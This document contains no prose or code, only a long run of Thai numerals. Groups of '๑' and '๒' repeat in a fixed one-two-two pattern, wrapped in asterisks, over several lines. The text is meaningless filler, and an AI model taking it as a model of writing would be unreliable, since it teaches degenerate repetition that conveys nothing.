*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* 